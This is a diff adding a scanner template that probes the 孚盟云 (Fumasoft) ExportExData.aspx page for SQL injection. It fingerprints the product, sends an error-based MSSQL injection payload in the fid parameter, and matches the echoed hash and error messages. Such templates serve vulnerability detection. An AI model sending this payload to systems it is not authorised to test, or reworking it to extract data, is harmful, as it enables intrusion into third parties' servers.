@@ -1,0 +1,48 @@
+id: poc-yaml-fumasoft-exportexdata-aspx-sqli
+
+info:
+  name: 孚盟云 ExportExData.aspx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "孚盟云"
+      - type: status
+        status:
+          - 200
+
+  - raw:
+      - |
+        GET /PagePopWindow/MailSpread/ExportExData.aspx?fid=1+OR+1%3C=sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "0x{{t2}}"
+          - "Exception"
+      - type: regex
+        part: body
+        regex:
+          - "转换成数据类型(.*?)时失败"
+          - "在将(.*?)值"
+      - type: status
+        status:
+          - 500
